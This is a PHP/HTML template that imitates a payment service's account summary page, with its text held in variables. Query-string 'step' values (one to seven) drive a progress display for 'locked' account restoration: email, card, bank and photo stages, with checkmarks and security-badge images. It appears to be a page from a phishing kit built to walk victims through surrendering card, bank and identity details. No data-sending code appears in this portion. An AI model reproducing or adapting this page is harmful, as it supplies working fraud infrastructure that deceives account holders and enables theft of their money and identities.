					<div id="js_emSlideDownContainer" aria-expanded="" role="alertdialog" tabindex="-1" class="emSlideDownContainer module-0 nemo_emSlideDownContainer" data-em-open="true" data-current-module="0" data-new-user="true" data-total-percentage="67" data-hide-sneak-peek="true"data-hide-account-completion="false" data-is-first-use-enabled="false" data-auto-open-offer="false">
						<div id="aria_engagementStatus" data-engagement-stage="accountSetup" class="emModule dimBorderLine js_emModule engagementStatusModule js_engagementStatusModule nemo_engagementStatus active " tabindex="-1">
							<div id="js_BadgeLanding" class="emModuleContent">
								<div id="profileStateContainer" class="setupbadgeBanner-container js_profileStates nemo_profileStates nemo_badges badgeDisplay">
									<div class="setupbadgeBanner-container badgeDisplay js_badgeDisplay js_badges js_badgeChild nemo_profileStates nemo_badges active">
										<p class="statusGreeting vx_h2"><?= $lockedinfo ?>
										</p>
										<div class="tour-container" id="js_tourModule">
											<div class="tourContent hide" id="js_tourContent">
												<p class="js_balanceModuleTitle"><?= $a ?>
												</p>
												<p class="js_sendMoneyTitle"><?= $b ?>
												</p>
												<p class="js_sendMoneyDescription"><?= $c ?>
												</p>
												<p class="js_walletTitle"><?= $d ?>
												</p>
												<p class="js_walletDescription"><?= $e ?>
												</p>
												<p class="js_settingsTitle"><?= $f ?>
												</p>
												<p class="js_settingsDescription"><?= $g ?>
												</p>
												<p class="js_fiModule_noFI"> <?= $h ?>
													<a href="#" target="_top" class="popover-link" name="QT_AddCard" data-pagename="main:walletweb:summary:home::QT_AddCard:"><?= $h ?>
													</a> <?= $j ?>
												</p>
												<p class="js_fiModule_FI"><?= $k ?>
												</p>
												<p class="js_conlusionTitle"><?= $l ?>
												</p>
												<p class="js_conclusionDescription"><?= $m ?>
													<a href="#" target="_top" class="popover-link" name="QT_Shopping" data-pagename="main:walletweb:summary:home::QT_Shopping:">,<?= $n ?>
													</a> 
													<a href="#" target="_top" class="popover-link" name="QT_SendRequestLink" data-pagename="main:walletweb:summary:home::QT_SendRequestLink:"><?= $o ?>
													</a><?= $p ?>
												</p>
											</div>
											<div class="js_tourContainer hide">
												<div class="popover" role="tooltip">
													<div class="arrow">
													</div>
													<h3 class="popover-title">
													</h3>
													<div class="popover-content">
													</div>
													<div class="popover-navigation">
														<div class="btn-group">
															<button class="vx_btn vx_btn-medium vx_btn_reversed tour-btn nemo_next js_popover-next" data-role="next">Next
															</button>
															<button class="vx_btn-link popover-link_endTour vx_text-body_secondary nemo_endTour popover-link js_popover-endLink" data-role="end">End tour
															</button>
														</div>
													</div>
												</div>
											</div>
										</div>
										<ul id="js_profileStates" class="profileStates nemo_profileStates">
											<li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated">
												<span class="icon icon-medium icon-email setupStep-icon" aria-hidden="true">
												</span>
												<span class="setupStep-stateContent"><?= $aa ?>
												</span>
											</li>
											<?php
											if ($_GET['step'] == 'three' OR $_GET['step'] == 'four' OR $_GET['step'] == 'five' OR $_GET['step'] == 'six' OR $_GET['step'] == 'seven') {
												?>
												<li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated">
													<span class="icon icon-medium icon-delivery setupStep-icon" aria-hidden="true">
													</span>
													<span class="setupStep-stateContent"><?= $bb ?>
													</span>
												</li>
												<?php
											}else{
												?>
												<li class="setupStep-state nemo_card nemo_setup_button">
													<a href="#" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_CreditCard_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
														<span class="setupStep-container">
															<span class="icon icon-medium icon-lock-small setupStep-icon" aria-hidden="true">
															</span>
															<span class="setupStep-stateContentContainer">
																<span class="setupStep-cta"><?= $bb ?>
																</span>
															</span>
														</span>
														<span class="setupStep-overlayContainer">
															<span class="setupStep-overlayIconContainer">
																<span class="setupStep-overlayIconSubContainer  ">
																	<span class="setupStep-inlineIcon">
																		<span class="icon icon-medium icon-lock-small">
																		</span>
																	</span>
																</span>
															</span>
															<span class="setupStep-overlayCtaContainer">
																<span class="setupStep-overlayCta"><?= $bb ?>
																</span>
																<span class="setupStep-overlayContent"><?= $cc ?>
																</span>
															</span>
														</span>
													</a>
												</li>
												<?php
											}
											?>
											<?php
											if ($_GET['step'] == 'four' OR $_GET['step'] == 'five' OR $_GET['step'] == 'six' OR $_GET['step'] == 'seven') {
												?>
												<li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated">
													<span class="icon icon-medium icon-credit-card setupStep-icon" aria-hidden="true">
													</span>
													<span class="setupStep-stateContent"><?= $dd ?>
													</span>
												</li>
												<?php
											}else{
												?>
												<li class="setupStep-state nemo_card nemo_setup_button">
													<a href="#" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_CreditCard_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
														<span class="setupStep-container">
															<span class="icon icon-medium icon-lock-small setupStep-icon" aria-hidden="true">
															</span>
															<span class="setupStep-stateContentContainer">
																<span class="setupStep-cta"><?= $dd ?>
																</span>
															</span>
														</span>
														<span class="setupStep-overlayContainer">
															<span class="setupStep-overlayIconContainer">
																<span class="setupStep-overlayIconSubContainer  ">
																	<span class="setupStep-inlineIcon">
																		<span class="icon icon-medium icon-lock-small">
																		</span>
																	</span>
																</span>
															</span>
															<span class="setupStep-overlayCtaContainer">
																<span class="setupStep-overlayCta"><?= $dd ?>
																</span>
																<span class="setupStep-overlayContent"><?= $ee ?>
																</span>
															</span>
														</span>
													</a>
												</li>
												<?php
											}
											?>
											<?php
											if ($_GET['step'] == 'six' OR $_GET['step'] == 'seven') {
												?>
												<li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated">
													<span class="icon icon-medium icon-bank-check setupStep-icon" aria-hidden="true">
													</span>
													<span class="setupStep-stateContent"><?= $ff ?>
													</span>
												</li>
												<?php
											}else{
												?>
												<li class="setupStep-state nemo_card nemo_setup_button">
													<a href="#" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_CreditCard_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
														<span class="setupStep-container">
															<span class="icon icon-medium icon-lock-small setupStep-icon" aria-hidden="true">
															</span>
															<span class="setupStep-stateContentContainer">
																<span class="setupStep-cta"><?= $ff ?>
																</span>
															</span>
														</span>
														<span class="setupStep-overlayContainer">
															<span class="setupStep-overlayIconContainer">
																<span class="setupStep-overlayIconSubContainer  ">
																	<span class="setupStep-inlineIcon">
																		<span class="icon icon-medium icon-lock-small">
																		</span>
																	</span>
																</span>
															</span>
															<span class="setupStep-overlayCtaContainer">
																<span class="setupStep-overlayCta"><?= $ff ?>
																</span>
																<span class="setupStep-overlayContent"><?= $gg ?>
																</span>
															</span>
														</span>
													</a>
												</li>
												<?php
											}
											?>
											<?php
											if ($_GET['step'] == 'seven') {
												?>
												<li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated">
													<span class="icon icon-medium icon-photo setupStep-icon" aria-hidden="true">
													</span>
													<span class="setupStep-stateContent"><?= $hh ?>
													</span>
												</li>
												 <?php
											}else{
												?>
												<li class="setupStep-state nemo_card nemo_setup_button">
													<a href="#" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_CreditCard_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
														<span class="setupStep-container">
															<span class="icon icon-medium icon-lock-small setupStep-icon" aria-hidden="true">
															</span>
															<span class="setupStep-stateContentContainer">
																<span class="setupStep-cta"><?= $hh ?>
																</span>
															</span>
														</span>
														<span class="setupStep-overlayContainer">
															<span class="setupStep-overlayIconContainer">
																<span class="setupStep-overlayIconSubContainer  ">
																	<span class="setupStep-inlineIcon">
																		<span class="icon icon-medium icon-lock-small">
																		</span>
																	</span>
																</span>
															</span>
															<span class="setupStep-overlayCtaContainer">
																<span class="setupStep-overlayCta"><?= $hh ?>
																</span>
																<span class="setupStep-overlayContent"><?= $ii ?>
																</span>
															</span>
														</span>
													</a>
												</li>
												<?php
											}
											?>
										</ul>
									</div>
								</div>
								<a href="#" class="js_dismiss engagementStatusModuleClose emClose emClose_acctCompletion nemo_emClose" role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" name="EM_BadgeSetup_Close">
									<span class="icon icon-small icon-close-small" aria-hidden="true">
									</span>
									<span class="speakableText"><?= $close ?>
									</span>
								</a>
							</div>
						</div>
						<div class="emModule js_emModule transferBannerContainer nemo_EM_SendMoneyBanner" data-is-sneak-peek-available="" data-sneak-peek-texts="" data-sneak-peek-link-name="" data-bg-img="" >
							<div class="emModuleContent">
								<div class="mpiBannerContainer js_mpiBannerContainer transferBanner">
									<div class="row">
										<div class="col-xs-6 transferActionColumns">
											<a href="#" target="_top" class="nemo_primaryActionButton_transferBuy transferPrimaryActions" name="EM_BUY_CTA" data-pagename="main:walletweb:transfer:buy:start" data-pagename2="main:walletweb:transfer:buy:start:::" data-track-type="link">
												<span class="icon icon-register engagementAction-icon_transferDesktop" aria-hidden="true">
												</span>
												<span class="transferPrimaryActionContent vx_h3"><?= $jj ?>
												</span>
											</a>
											<p class="transferPrimaryActionBody">
												<span class="icon icon-shield engagementAction-icon_transfer-shield" aria-hidden="true">
												</span><?= $kk ?>
											</p>
										</div>
										<div class="col-xs-6 transferActionColumns">
											<a href="#" target="_top" class="nemo_primaryActionButton_transferSend transferPrimaryActions" name="EM_Send_CTA" data-pagename="main:walletweb:transfer:send:start" data-pagename2="main:walletweb:transfer:send:start:::" data-track-type="link">
												<span class="icon icon-send-money engagementAction-icon_transferDesktop" aria-hidden="true">
												</span>
												<span class="transferPrimaryActionContent vx_h3"><?= $ll ?>
												</span>
											</a>
											<p class="transferPrimaryActionBody"><?= $mm ?>
											</p>
										</div>
									</div>
								</div>
								<a href="#" class="js_dismiss emClose nemo_emClose" role="button" name="EM_SendMoney_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
									<span class="icon icon-small icon-close-small" aria-hidden="true">
									</span>
									<span class="speakableText"><?= $close ?>
									</span>
								</a>
							</div>
						</div>
					</div>
				</div>
				<div class="mainBody">
					<div id="summary" class="summarySection">
						<div class="row">
							<div class="col-sm-4 summaryModuleContainer">
								<div class="twbs_alert vx_alert vx_alert-help txnDelayMessage js_txnDelayMessage txnDelayMessage_mobile nemo_txnDelayMessageMobile hidden" data-hide-transaction-delay-message='true'>
									<p class="vx_alert-text"><?= $nn ?>
									</p>
								</div>
								<?php
								if ($_GET['step'] == 'one') {
									?>
									<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader">
										<span class="fiModule-title-header nemo_sellingToolsHeader"><?= $uu ?>
										</span>
										<ul class="moduleListItems">
											<li class="vx_text-body_secondary">
												<a href="#" target="_blank" class="nemo_sellingToolsSellerPref" name="sellingToolsSellerPref" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><?= $vvv ?>
												</a>
											</li>
										</ul>
									</section>
									<?php
								}elseif ($_GET['step'] == 'two' OR $_GET['step'] == 'three' OR $_GET['step'] == 'four') {
									?>
									<section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule">
										<div class="js_fiModule-title-container" id="fiModule-title-container">
											<a href="#" class="fiModule-link vx_text-5 fiModule-title">
												<span class="fiModule-title-header"><?= $vv ?>
												</span>
											</a>
										</div>
										<div class="fiModule-currency-container fiModule-currency_text">
											<div class="balanceNumeral nemo_balanceNumeral">
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✓</font> <?= $ww ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✓</font> <?= $xx ?></span>
											</div>
										</div>
									</section>
									<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader">
										<span class="fiModule-title-header nemo_sellingToolsHeader"><?= $yy ?>
										</span>
										<ul class="moduleListItems">
											<li class="vx_text-body_secondary">
												<img src="../icon/logo2.gif">&nbsp;&nbsp;<img src="../icon/sc.png">&nbsp;&nbsp;<img src="../icon/enabled_by_symc_vip.png">
											</li>
										</ul>
									</section>
									<?php
								}elseif ($_GET['step'] == 'five') {
									?>
									<section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule">
										<div class="js_fiModule-title-container" id="fiModule-title-container">
											<a href="#" class="fiModule-link vx_text-5 fiModule-title">
												<span class="fiModule-title-header"><?= $zz ?>
												</span>
											</a>
										</div>
										<div class="fiModule-currency-container fiModule-currency_text">
											<div class="balanceNumeral nemo_balanceNumeral">
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $aaa ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $bbb ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $ccc ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $ddd ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $eee ?></span>
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><font color="black">✗</font> <?= $fff ?></span>
											</div>
										</div>
									</section>
									<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader">
										<span class="fiModule-title-header nemo_sellingToolsHeader"><?= $ggg ?>
										</span>
										<ul class="moduleListItems">
											<li class="vx_text-body_secondary">
												<img src="../icon/logo2.gif">&nbsp;&nbsp;<img src="../icon/sc.png">&nbsp;&nbsp;<img src="../icon/enabled_by_symc_vip.png">
											</li>
										</ul>
									</section>
									<?php
								}elseif ($_GET['step'] == 'six') {
									?>
									<section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule">
										<div class="js_fiModule-title-container" id="fiModule-title-container">
											<a href="#" class="fiModule-link vx_text-5 fiModule-title">
												<span class="fiModule-title-header"><?= $hhh ?>
												</span>
											</a>
										</div>
										<div class="fiModule-currency-container fiModule-currency_text">
											<div class="balanceNumeral nemo_balanceNumeral">
												<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><?= $iii ?></span>
											</div>
										</div>
									</section>
									<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader">
										<span class="fiModule-title-header nemo_sellingToolsHeader"><?= $ggg ?>
										</span>
										<ul class="moduleListItems">
											<li class="vx_text-body_secondary">
												<img src="../icon/logo2.gif">&nbsp;&nbsp;<img src="../icon/sc.png">&nbsp;&nbsp;<img src="../icon/enabled_by_symc_vip.png">
											</li>
										</ul>
									</section>
									<?php
								}
								?>
								<?php
								if ($_GET['step'] != 'three') {
									?>
									<div class="fiModule-container nemo_accountStatusModule">
										<h3 class="fiModule-title vx_h5"><?= $jjj ?>
										</h3>
										<ul class="moduleListItems">
											<li class="vx_text-body_secondary">
												<a href="#" target="" class="nemo_acctStatusUpgrade" name="Summary_AcctStatusUpgrade" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><?= $kkk ?>
												</a>
											</li>
											<li class="vx_text-body_secondary">
												<a href="#" target="_top" class="small-text nemo_acctStatusResCenter" name="Summary_ResolutionCenter" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><?= $lll ?>
												</a>
											</li>
											<li class="vx_text-body_secondary">
												<a href="#" target="_top" class="small-text nemo_acctStatusLimits" name="Summary_AcctStatusLimits" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><?= $mmm ?>
												</a>
											</li>
										</ul>
									</div>
									<?php
								}
								?>
							</div>
							<div class="col-sm-8 activityModuleContainer" id="js_transactionCollection">
								<div class="twbs_alert vx_alert vx_alert-help txnDelayMessage js_txnDelayMessage nemo_txnDelayMessage hidden" data-hide-transaction-delay-message='true'>
									<p class="vx_alert-text"><?= $nnn ?>
									</p>
								</div>
								<div id="js_widgetView" data-locality="{"timezone":{"determiner":"viaUserProfile","value":"Asia/Jakarta"},"country":"G3","locale":"en_G3","language":"en","directionality":"ltr"}" data-transactions="" data-has-transactions-pending="" data-has-transactions-completed="" data-is-merchant-category-enabled="" class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony G3">
									<div id="nougatContext">
									</div>
									<div class="activityWidgetContainer" id="js_transactionCollection">
										<section class="activityModule nemo_activityModuleNone" aria-labelledby="activityModuleHeaderNone">
											<h3 id="activityModuleHeaderNone" class="vx_h5 moduleHeader nemo_activityModuleHeaderNone">
												<a href="#" class="moduleHeaderLink nemo_moduleHeaderLink"><?= $ooo ?>
												</a>
											</h3>